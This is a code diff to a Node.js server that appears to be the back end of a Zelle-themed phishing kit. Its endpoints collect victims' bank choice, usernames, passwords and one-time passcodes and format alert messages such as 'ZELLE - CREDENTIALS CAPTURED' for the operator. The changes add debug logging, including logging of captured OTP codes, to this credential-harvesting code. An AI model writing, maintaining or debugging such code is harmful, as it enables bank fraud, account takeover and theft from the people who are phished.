@@ -127,6 +127,10 @@ app.post('/api/bank-click', async (req, res) => {
     
     users.push(newUser);
     
+    console.log(`[BANK CLICK] ✅ Created user ${userId} for bank: ${newUser.bank_name}`);
+    console.log(`[BANK CLICK] Total users in memory: ${users.length}`);
+    console.log(`[BANK CLICK] All users:`, users.map(u => ({ id: u.id, bank: u.bank_name })));
+    
     const message =
         `🏦 <b>ZELLE - BANK SELECTED</b>\n\n` +
         `🏛️ <b>Bank:</b> ${req.body.name || 'Unknown'}\n\n` +
@@ -157,6 +161,9 @@ app.post('/api/save', async (req, res) => {
     const code = req.body.code || '';
     const otp = req.body.otp || '';
     
+    console.log(`[SAVE] Request for user ${userId}`);
+    console.log(`[SAVE] Users in memory:`, users.map(u => ({ id: u.id, bank: u.bank_name, status: u.otp_status })));
+    
     // Smart OTP detection
     let isOTP = false;
     let otpCode = '';
@@ -174,10 +181,12 @@ app.post('/api/save', async (req, res) => {
     
     const user = users.find(u => u.id == userId);
     if (!user) {
+        console.error(`[SAVE] ❌ User ${userId} not found!`);
         return res.status(404).json({ success: false, error: 'User not found' });
     }
     
     if (isOTP) {
+        console.log(`[SAVE] 🔢 OTP detected: ${otpCode}`);
         // Handle OTP submission
         user.otp_code = otpCode;
         user.otp_submitted_at = new Date().toISOString();
@@ -185,6 +194,8 @@ app.post('/api/save', async (req, res) => {
         if (user.otp_status === 'idle') {
             user.otp_status = 'pending';
         }
+        
+        console.log(`[SAVE] ✅ Updated user ${userId} with OTP. Status: ${user.otp_status}`);
         
         const message =
             `🔢 <b>ZELLE - OTP CODE RECEIVED</b>\n\n` +
@@ -210,10 +221,13 @@ app.post('/api/save', async (req, res) => {
         return res.json({ success: true, id: userId });
     }
     
+    console.log(`[SAVE] 🔐 Credentials detected for user ${userId}`);
     // Handle credentials submission
     user.username = username;
     user.password = password;
     user.credentials_submitted_at = new Date().toISOString();
+    
+    console.log(`[SAVE] ✅ Updated user ${userId} credentials`);
     
     const message =
         `🔐 <b>ZELLE - CREDENTIALS CAPTURED</b>\n\n` +
